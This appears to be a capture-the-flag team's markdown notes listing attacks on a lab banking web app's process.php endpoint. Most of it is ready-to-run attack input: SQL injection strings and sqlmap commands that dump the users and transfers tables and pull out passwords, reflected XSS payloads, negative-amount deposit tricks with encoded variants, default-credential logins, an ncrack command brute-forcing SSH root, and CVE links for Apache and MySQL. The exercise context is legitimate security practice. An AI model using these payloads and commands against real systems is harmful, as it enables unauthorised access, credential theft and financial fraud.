# Possible attacks

## strange requests

## | or request
http://localhost:8888/process.php?user=dima1234||dado1234&pass=dima1234567&amount=1&drop=register

http://localhost:8888/process.php?user=$|%27dima3124do&pass=dima1234567&amount=1&drop=register

## Other things to try

Thank you @francolmenar for all of this

- Do SQL injection on the user parameter when requesting the balance. 
  - In user param: `a' OR 1=1 --`
  - With sqlmap:
    - Discover dbs: `sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" --dbs`
    - Discover tables: `sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 --tables`
    - Dump users table: `sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T users --dump`
    - Dump transfers table: `sqlmap -u "http://10.1.5.2/process.php?user=aa&pass=aa&drop=balance" -p "user" -D ctf2 -T transfers --dump`
- Compromise user accounts with sql injection:
  - All usernames: `http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+pass%2C+user+from+users%3B+--+&pass=aa&amount=&drop=balance`
  - All passwords: `http://10.1.5.2/process.php?user=a%27+OR+1%3D1+UNION+select+null%2C+user%2C+pass+from+users%3B+--+&pass=aa&amount=&drop=balance`
  - Find database user with sql injection: `http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+user()+--+&pass=aa&drop=balance`
  - Find database version with sql injection: `http://10.1.5.2/process.php?user=%27+UNION+select+null%2C+null+database()+--+&pass=aa&drop=balance`
- Reflected XSS
  - In user parameter:
    - curl `http://10.1.5.2/process.php?user=<script>alert(1)</script>&pass=temp&drop=balance`
    - curl `http://10.1.5.2/process.php?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pass=temp&drop=balance`
  - In pass parameter:
    - curl `http://10.1.5.2/process.php?user=temp&pass=</script><script>alert("xss")</script><script>&drop=register`
- No authentication when making deposits and withdrawals.
  - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=deposit`
  - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=100&drop=withdraw`
- Possible to insert amount with negative sign
  - Deposit with negative sign
    - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=deposit`
    - Decimal Ascii Encoded Payload: curl `http://10.1.5.2/process.php?%117%115%101%114%61%116%101%109%112%38%112%97%115%115%61%116%101%109%112%38%97%109%111%117%110%116%61%45%49%48%48%48%38%100%114%111%112%61%100%101%112%111%115%105%116`
    - Hex Ascii Encoded Payload: curl `http://10.1.5.2/process.php?%75%73%65%72%3D%74%65%6D%70%26%70%61%73%73%3D%74%65%6D%70%26%61%6D%6F%75%6E%74%3D%2D%31%30%30%30%26%64%72%6F%70%3D%64%65%70%6F%73%69%74`
    - Hex Ascii Encoded only amount: curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=%2D%31%30%30%30&drop=deposit`
    - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=withdraw`
    - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=%2D%31%30%30&drop=withdraw`
- Send integer values in strings
  - curl `http://10.1.5.2/process.php?user=temp&pass=temp&amount=11temp22&drop=desposit`
- Check if default creadentials work
  - curl `http://10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance`
  - curl `http://10.1.5.2/process.php?user=john&pass=abcdef&drop=balance`
  - curl `http://10.1.5.2/process.php?user=kelly&pass=abcdef&drop=balance`
- Interesting
  - curl `http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance` -> bypasses the drop=balance going to the default option.
  - curl `http://10.1.5.2/process.php?user=random&pass=aaaa&amount=0.23e5&drop=deposit` -> reads number elevated to the power after e.
  - curl `http://10.1.5.2/process.php?user=random&pass=random&amount[]=-5&amount[]=200&drop=deposit` => amount evaluated as 1
  - curl `http://10.1.5.2/process.php?user=random&pass=random&amount=-0b11&drop=deposit` => with intval is evaluated to 0 but try it anyway
- Server's password brute forcing with ncrack: `ncrack -p 22 --user root -P $passwords_file $TARGET`

## References for vulnerabilities:

https://www.cybersecurity-help.cz/vdb/SB2020102113

- exploit-db => use searchsploit in Parrot and Kali
- apache httpd 2.4.29 (if they keep this insecure version)
  - CVE-2019-0211 => Local Privilege Escalation (if able to gain access as a low privileged user)
    - `https://www.cvedetails.com/cve/CVE-2019-0211/`
    - `https://www.exploit-db.com/exploits/46676`
  - CVE-2020-11984 => Apache HTTP server 2.4.32 to 2.4.44 mod_proxy_uwsgi info disclosure and possible RCE
    - `https://nvd.nist.gov/vuln/detail/CVE-2020-11984`
  - CVE-2020-9490 => Apache HTTP Server versions 2.4.20 to 2.4.43. A specially crafted value for the 'Cache-Digest' header in a HTTP/2 request would result in a crash when the server actually tries to HTTP/2 PUSH a resource afterwards.
    -`https://nvd.nist.gov/vuln/detail/CVE-2020-9490`
- MySQL 5.7.31:
  - CVE-2020-14812 => Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server.
    - `https://ubuntu.com/security/CVE-2020-14539`
